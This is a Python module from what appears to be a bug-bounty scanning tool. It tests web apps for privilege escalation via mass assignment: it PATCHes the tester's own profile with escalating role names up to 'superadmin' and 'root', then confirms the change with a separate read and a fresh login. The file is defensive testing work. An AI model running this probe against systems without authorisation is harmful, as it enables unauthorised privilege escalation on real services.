"""
core/wraith/self_escalation.py

Bounty-safe privilege-escalation proof: change your OWN account's role via mass
assignment and confirm it stuck — without ever wielding the privilege.

Two disciplines, both from the review:

  Least-spicy first, stop on first proof. Try the lowest-risk plausible role before
  admin, and the moment one is confirmed, stop. No spraying role names like a raccoon
  with a thesaurus; candidates are ordered least→most privileged and bounded.

  Confidence, reported honestly. "Role accepted and reflected" does NOT mean it is
  authoritative — apps echo request bodies like deranged parrots. So the proof is
  graded:
    LOW     the PATCH response merely echoes the submitted body (NOT reported —
            pure client echo is the classic false positive)
    MEDIUM  a SEPARATE GET /me reflects the new role (it was stored)
    HIGH    a FRESH login/session still reflects it (server-authoritative state)

Everything happens on the researcher's own account: `PATCH /me` (PRIVILEGE_MUTATION,
allowed on an owned account) then reads. No admin route is touched, no privileged
action is performed — capability is confirmed, not consumed. `send`/`relogin` are
injectable and go through the policy executor.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Any, Awaitable, Callable, List, Optional

from core.cortex.escalation_amplification import (
    _PROFILE_ENDPOINTS, _ROLE_FIELDS, _make_profile_escalator,
)
from core.wraith.bola_probe import _deep_get

logger = logging.getLogger(__name__)

Send = Callable[..., Awaitable[Any]]
Relogin = Callable[[], Awaitable[Optional[Send]]]

LOW, MEDIUM, HIGH = "LOW", "MEDIUM", "HIGH"
_CONF = {LOW: 1, MEDIUM: 2, HIGH: 3}

# Least → most privileged. Curated to common, plausible role names (not a spray);
# an app's own OpenAPI enum, when supplied via candidate_roles, takes precedence.
_TRY_ORDER = ["member", "contributor", "support_agent", "support", "editor",
              "manager", "moderator", "staff", "operator", "workspace_admin",
              "admin", "administrator", "owner", "platform_admin", "superadmin", "root"]


@dataclass
class SelfEscalationProof:
    endpoint: str
    field: str
    baseline_value: str
    escalated_value: str
    confidence: str
    evidence: str

    @property
    def severity(self) -> str:
        return "HIGH" if self.confidence == HIGH else "MEDIUM"

    def to_finding(self) -> dict:
        return {
            "type": "Privilege escalation via mass assignment (self-reflection, bounty-safe)",
            "severity": self.severity,
            "tool": "self_escalation",
            "target": self.endpoint,
            "message": (f"A low-privilege account changed its OWN '{self.field}' from "
                        f"{self.baseline_value!r} to {self.escalated_value!r} via {self.endpoint}. "
                        f"Confirmed at {self.confidence} confidence ({self.evidence}). No privileged "
                        f"action was performed — capability confirmed, not consumed."),
            "tags": ["verified", "mass_assignment", "privilege_escalation", "minimal_impact",
                     f"confidence_{self.confidence.lower()}"],
            "families": ["confirmed_vuln"],
            "metadata": {"vuln_class": "mass_assignment", "subtype": "self_escalation",
                         "field": self.field, "baseline": self.baseline_value,
                         "escalated": self.escalated_value, "confidence": self.confidence,
                         "evidence": self.evidence,
                         "intended_invariant": (f"A low-privilege user must not change their own "
                                                f"'{self.field}' to a higher-privileged value."),
                         "observed_violation": (
                             f"a self-service {self.field} change {self.baseline_value!r}→"
                             f"{self.escalated_value!r} was " + ("server-authoritative (survived a "
                             "fresh login)" if self.confidence == HIGH else "reflected by the server"))},
        }


def _plausible_roles(baseline: str, candidate_roles: Optional[List[str]]) -> List[str]:
    if candidate_roles:
        return [str(r) for r in candidate_roles]
    b = str(baseline).lower()
    if b in _TRY_ORDER:                       # only roles MORE privileged than baseline
        return _TRY_ORDER[_TRY_ORDER.index(b) + 1:]
    return list(_TRY_ORDER)                    # baseline is a low/unknown role → try all


def _reflects(resp: Any, field: str, value: str) -> bool:
    return str(_deep_get(resp, field)) == str(value)


async def prove_self_escalation(
    origin: str,
    *,
    send: Send,
    relogin: Optional[Relogin] = None,
    candidate_roles: Optional[List[str]] = None,
    max_values: int = 3,
    min_confidence: str = MEDIUM,
) -> Optional[SelfEscalationProof]:
    """Try to escalate the caller's own role with the least-spicy plausible value,
    stop on the first confirmed self-reflection, and grade the confidence. Returns
    None unless a value is confirmed at >= min_confidence (echo-only never counts)."""
    esc = await _make_profile_escalator(origin, send, _PROFILE_ENDPOINTS, _ROLE_FIELDS)
    if esc is None:
        return None
    endpoint, field, baseline = esc.endpoint, esc.role_field, esc.original_role
    url = origin + endpoint

    attempts = 0
    for role in _plausible_roles(baseline, candidate_roles):
        if attempts >= max_values:
            break
        if str(role).lower() == str(baseline).lower():
            continue
        attempts += 1

        # Mutate own role (PATCH, then PUT as a fallback).
        patched = None
        for method in ("PATCH", "PUT"):
            try:
                st, resp = await send(method, url, {field: role})
            except Exception:
                continue
            if 200 <= int(st) < 300:
                patched = resp
                break
        if patched is None:
            continue                          # rejected (e.g. 400 invalid role) → next value

        # MEDIUM: a SEPARATE read must reflect it (not just the PATCH echo = LOW).
        try:
            st2, me = await send("GET", url, None)
        except Exception:
            continue
        if not (200 <= int(st2) < 300 and _reflects(me, field, role)):
            continue                          # echo-only or not stored → below the bar

        confidence = MEDIUM
        evidence = f"a separate GET {endpoint} reflects {field}={role!r} (baseline {baseline!r})"

        # HIGH: a FRESH login still reflects it → server-authoritative, not this session.
        if relogin is not None:
            try:
                fresh = await relogin()
            except Exception:
                fresh = None
            if fresh is not None:
                try:
                    st3, me3 = await fresh("GET", url, None)
                except Exception:
                    st3, me3 = 0, None
                if 200 <= int(st3) < 300 and _reflects(me3, field, role):
                    confidence = HIGH
                    evidence = (f"a FRESH login still reflects {field}={role!r} — the role is "
                                f"server-authoritative state, not a client-side echo")

        if _CONF[confidence] >= _CONF[min_confidence]:
            logger.info("[self_escalation] %s→%s confirmed at %s confidence",
                        baseline, role, confidence)
            return SelfEscalationProof(endpoint=endpoint, field=field,
                                       baseline_value=str(baseline), escalated_value=str(role),
                                       confidence=confidence, evidence=evidence)
    return None
